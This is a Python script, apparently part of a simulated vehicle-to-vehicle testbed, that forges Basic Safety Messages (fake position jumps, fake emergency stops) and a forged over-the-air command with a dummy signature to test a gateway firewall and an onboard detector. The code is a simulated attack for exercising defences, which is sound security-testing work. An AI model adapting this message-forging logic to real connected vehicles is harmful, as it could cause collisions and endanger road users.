"""attacker.py - injects forged V2V messages (BSM) toward a victim car.

  python attacker.py --victim 3 --mode teleport            # unsigned  -> gateway firewall drops it
  python attacker.py --victim 3 --mode teleport --signed   # stolen key -> passes gateway, HPC detector rejects it
  python attacker.py --victim 3 --mode brake  --signed
  python attacker.py --victim 3 --mode badota              # forged OTA -> gateway rejects (bad signature)
Modes: teleport = fake position 40 m ahead, brake = fake sudden stop, badota = unsigned cloud command.
Also callable from the cloud dashboard via run()."""
import argparse
import time
import config as C
from bus import Node, signed
from config import T
from path_model import ClosedPath


def run(victim, mode="teleport", use_key=False, duration=10.0):
    node = Node(f"attacker.car{victim}")
    pred = victim - 1
    end = time.time() + duration / C.TIME_SCALE
    forged_t = set()

    if mode == "badota":
        while time.time() < end:
            node.pub(T.down(victim), {"target_speed": 30.0, "detector_tol": 9999.0,
                                      "version": "evil", "seq": int(time.time() * 1000), "sig": "deadbeef"})
            time.sleep(1.0 / C.TIME_SCALE)
    else:
        L = ClosedPath(C.WAYPOINTS_CSV).length

        def on_bsm(topic, m):
            if time.time() > end or m["t"] in forged_t:      # ignore my own forgeries
                return
            f = {"id": pred, "s": m["s"], "v": m["v"], "a": m.get("a", 0.0), "t": m["t"] + 0.05}
            if mode == "teleport":
                f["s"] = (m["s"] + 40.0) % L
            elif mode == "brake":
                f["v"] = 0.0
            forged_t.add(f["t"])
            node.pub(T.bsm(pred), signed(f, C.V2V_KEY) if use_key else f)

        node.sub(T.bsm(pred), on_bsm)
        while time.time() < end:
            time.sleep(0.1)
    node.client.loop_stop()
    node.client.disconnect()
    print(f"[attacker] finished ({mode}, victim={victim})", flush=True)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--victim", type=int, default=3)
    ap.add_argument("--mode", default="teleport", choices=["teleport", "brake", "badota"])
    ap.add_argument("--signed", action="store_true", help="use the stolen fleet key")
    ap.add_argument("--duration", type=float, default=10.0, help="sim seconds")
    a = ap.parse_args()
    run(a.victim, a.mode, a.signed, a.duration)
